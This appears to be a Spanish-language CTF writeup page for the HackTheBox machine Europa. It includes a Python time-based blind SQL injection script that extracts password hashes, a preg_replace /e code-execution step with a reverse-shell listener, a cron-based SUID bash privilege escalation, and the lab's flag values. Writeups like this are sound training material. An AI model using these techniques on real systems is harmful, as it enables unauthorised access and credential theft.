@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Europa - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Europa - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Europa de hackthebox una maquina linux de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los CommonNames, ademas adicionalmente explotaremos una blind sql haciendo scripting en python. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de regex que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario root nos aprovecharemos de una tarea cron en la que manipularemos el permiso de la bash. Maquina curiosa asi que vamos a darle!." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Europa de hackthebox una maquina linux de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los CommonNames, ademas adicionalmente explotaremos una blind sql haciendo scripting en python. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de regex que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario root nos aprovecharemos de una tarea cron en la que manipularemos el permiso de la bash. Maquina curiosa asi que vamos a darle!." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Europa" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Europa" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Europa/europa.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-07T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Europa/europa.jpeg" />
+<meta property="twitter:title" content="Maquina Europa - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-08-07T00:00:00+00:00","datePublished":"2023-08-07T00:00:00+00:00","description":"El dia de hoy vamos a resolver Europa de hackthebox una maquina linux de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los CommonNames, ademas adicionalmente explotaremos una blind sql haciendo scripting en python. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de regex que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario root nos aprovecharemos de una tarea cron en la que manipularemos el permiso de la bash. Maquina curiosa asi que vamos a darle!.","headline":"Maquina Europa - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Europa/europa.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Europa"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Europa"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Europa - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-08-07">07 Aug 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Europa/europa.jpeg" alt="Maquina Europa - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Europa</code> de <code>hackthebox</code> una maquina <code>linux</code> de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los <code>CommonNames</code>, ademas adicionalmente explotaremos una <code>blind sql</code> haciendo scripting en <code>python</code>. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de <code>regex</code> que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario <code>root</code> nos aprovecharemos de una tarea <code>cron</code> en la que manipularemos el permiso de la <code>bash</code>.</p>
+
+<p>Maquina curiosa asi que vamos a darle!.</p>
+
+<p>Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Europa
+❯ ls
+
+ Europa
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.22
+PING 10.10.10.22 (10.10.10.22) 56(84) bytes of data.
+64 bytes from 10.10.10.22: icmp_seq=1 ttl=63 time=132 ms
+
+--- 10.10.10.22 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 131.781/131.781/131.781/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>63</code> y por proximidad seria correspondiente a una maquina <code>linux</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.22 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:20 GMT
+Initiating SYN Stealth Scan at 01:20
+Scanning 10.10.10.22 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.22
+Discovered open port 443/tcp on 10.10.10.22
+Discovered open port 80/tcp on 10.10.10.22
+Completed SYN Stealth Scan at 01:20, 26.93s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.22
+Host is up, received user-set (0.15s latency).
+Scanned at 2023-08-07 01:20:05 GMT for 26s
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 27.06 seconds
+           Raw packets sent: 131086 (5.768MB) | Rcvd: 25 (1.100KB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,80,443 10.10.10.22 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:22 GMT
+Nmap scan report for 10.10.10.22
+Host is up (0.24s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
+|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
+|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
+| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
+| Not valid before: 2017-04-19T09:06:22
+|_Not valid after:  2027-04-17T09:06:22
+|_ssl-date: TLS randomness does not represent time
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.12 seconds
+</code></pre>
+
+<p>Visulizamos información interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.18</td>
+    </tr>
+    <tr>
+      <td>443</td>
+      <td>HTTPS</td>
+      <td>Apache httpd 2.4.18</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotacion">EXPLOTACION <a href="#explotacion">#</a></h2>
+
+<p>Comenzamos usando <code>whatweb</code>, para determinar las tecnologias que esta usando el servicio web.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.22
+http://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
+❯ whatweb https://10.10.10.22
+https://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
+</code></pre>
+
+<p>La herramienta no nos reporta mucha información, pero si vemos anteriormente <code>nmap</code> nos reporto <code>CommonNames</code> en el puerto 443, referentes a <code>europacorp.htb</code>. Asi que vamos a proceder a añadirlos a nuestro <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.22 europacorp.htb admin-portal.europacorp.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Si ahora vemos el servicio correspondiente al dominio <code>admin-portal.europacorp.htb</code> en el navegador, nos redirige a un panel de login.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro1.PNG" alt="" /></p>
+
+<p>Usaremos <code>burpsuite</code> para intentar manipular la petición e intentar colar una inyección.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro2.PNG" alt="" /></p>
+
+<p>Probamos a tratar de realizar una inyección sql, aplicando un <code>order by</code> basandonos en la quinta columna, obtenemos un codigo de estado <code>302</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro3.PNG" alt="" /></p>
+
+<p>Si aplicamos un <code>follow redirect</code>, vemos que nos logea al panel administrativo.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro4.PNG" alt="" /></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro5.PNG" alt="" /></p>
+
+<p>Podriamos seguir resolviendo la maquina, pero si ahora queremos realizar una enumeración de la base de datos para obtener mayor información podemos aprovecharnos de una de las columnas, y intentariamos obtener el nombre por ejemplo de la base de datos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro6.PNG" alt="" /></p>
+
+<p>Pero vemos que no podemos ver el <code>output</code> de la inyección; por lo tanto ya que estamos a ciegas tendriamos que realizar una inyección basada en tiempo.</p>
+
+<p>Ojo esto es opcional, ya que podriamos continuar con el desarrollo de la máquina normalmente.</p>
+
+<p>Continuando para seguir con la explotación de la <code>sql time based</code>, vamos a mandar una query en especifico que sera la siguente, donde aplicaremos una condición que al ser el primer caracter del nombre de la base de datos una <code>a</code> la petición tardara 5 segundos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro7.PNG" alt="" /></p>
+
+<p>Se valida la inyección correctamente asi que podemos tratar de automatizar el proceso montandonos un script en python y de esta manera obtendriamos la contraseña.</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import string
+import urllib3
+import sys, pdb, signal, time, requests
+
+
+def def_handler(sig, frame):
+    print("\n[!] Saliendo...!\n")
+    sys.exit(1)
+
+#ctrl_c
+signal.signal(signal.SIGINT, def_handler)
+
+#globlal vars
+main_url = "https://admin-portal.europacorp.htb/login.php"
+characters = string.digits + 'abcdef'
+urllib3.disable_warnings()
+
+def makeRequest():
+    s = requests.session()
+    s.verify = False
+    
+    p1 = log.progress("Fuerza Bruta")
+
+    p1.status("Iniciando proceso de Fuerza Bruta")
+
+    time.sleep(2)
+    
+    p2 = log.progress("Database")
+
+    data = ""
+    for position in range(1, 50):
+        for character in characters:
+
+            post_data = {
+                    'email':"admin@europacorp.htb' and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(3),1)-- -" % (position, character),
+                    'password':'admin'
+            }
+
+            p1.status(post_data['email'])
+            time_start = time.time()
+            r = s.post(main_url, data=post_data)
+            time_end = time.time()
+
+            if time_end - time_start &gt; 3:
+                data += character
+                p2.status(data)
+                break
+if __name__ == '__main__':
+    makeRequest()
+
+</code></pre>
+
+<p>Obtenemos un contraseña hasheada la cual intentaremos crackear.</p>
+
+<pre><code class="language-bash">2b6d315337f18617ba18922c0b9597ff
+</code></pre>
+
+<p>si lo crackeamos online obtenemos la siguiente contraseña <code>SuperSecretPassword!</code>, la cual es valida para el usuario <code>admin</code> y nos permite igualmente poder logearnos al sistema.</p>
+
+<p>Una vez dentro del dashboard vemos la opción de <code>Tools</code>, donde podemos ver un generador de VPN que vamos a interceptar tambien con <code>burpsuite</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro8.PNG" alt="" /></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro9.PNG" alt="" /></p>
+
+<p>Urldecodeamos la petición y para ver en texto claro como se envia la petición, ahi observamos que se aplica un patron en <code>pattern</code> a traves de expresiones regulares.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro10.PNG" alt="" /></p>
+
+<p>Probamos a validar con una expresión comun de regex y efectivamente se aplica mediante el patron.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro11.PNG" alt="" /></p>
+
+<p>Si ahora investigamos un poco existe una vulnerabilidad de la cual nos podemos aprovechar a traves de la <code>regex</code>, te dejo aqui un articulo para que lo revises a mayor detalle:</p>
+
+<ul>
+  <li><a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace</a></li>
+</ul>
+
+<p>Basicamente si le agregamos <code>e</code> en la regex, podemos ejecutar codigo <code>php</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro12.PNG" alt="" /></p>
+
+<p>Despues de validar que podemos ejecutar comandos, vamos a enviarnos un revere shell para obtener acceso a la maquina, sin olvidar poner los <code>&amp;</code> en urlencode.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Europa/euro13.PNG" alt="" /></p>
+
+<p>Nos ponemos en escucha y obtenemos acceso como el usuario <code>www-data</code></p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.22.
+Ncat: Connection from 10.10.10.22:54978.
+bash: cannot set terminal process group (1394): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@europa:/var/www/admin$ whoami
+whoami
+www-data
+</code></pre>
+
+<p>Como siempre vamos a obtener un tty full interactiva,</p>
+
+<pre><code class="language-bash">www-data@europa:/var/www/admin$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@europa:/var/www/admin$ ^Z           
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@europa:/var/www/admin$ export TERM=xterm
+www-data@europa:/var/www/admin$ export SHELL=bash
+</code></pre>
+<p>y ahora podemos leer la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">www-data@europa:/var/www/admin$ cd /home/john/
+www-data@europa:/home/john$ cat user.txt 
+69ec17e87bcbe179e22c14a776351728
+</code></pre>
+
+<h2 id="elevacion-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#elevacion-de-privilegios">#</a></h2>
+
+<p>Enumerando el sistema podemos ver que se esta ejecutando una tarea a intervalos de tiempo.</p>
+
+<pre><code class="language-bash">www-data@europa:/home/john$ cat /etc/crontab       
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * *	root	/var/www/cronjobs/clearlogs
+</code></pre>
+
+<p>Si leemos el archivo, vemos que ejecuta un script en bash <code>logcleared.sh</code>.</p>
+
+<pre><code class="language-bash">www-data@europa:/home/john$ cat /var/www/cronjobs/clearlogs
+#!/usr/bin/php
+&lt;?php
+$file = '/var/www/admin/logs/access.log';
+file_put_contents($file, '');
+exec('/var/www/cmd/logcleared.sh');
+?&gt;
+</code></pre>
+
+<p>Si tratamos de ver el archivo, podemos observar que este no existe, pero podemos crearlo.</p>
+
+<pre><code class="language-bash">www-data@europa:/home/john$ touch /var/www/cmd/logcleared.sh
+</code></pre>
+
+<p>Ya que el usuario <code>root</code> esta ejecutando la tarea cron, vamos a insertar un codigo en donde otorguemos el permiso <code>suid</code> a la bash.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+chmod u+s /bin/bash
+</code></pre>
+
+<p>Ahora revisamos el permiso de la bash y podemos convertirnos en el usuario <code>root</code> y visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">www-data@europa:/home/john$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
+www-data@europa:/home/john$ bash -p
+bash-4.3# cd /root
+bash-4.3# cat root.txt 
+5245239446324bb1fe4343385751f280
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Europa - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Europa" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
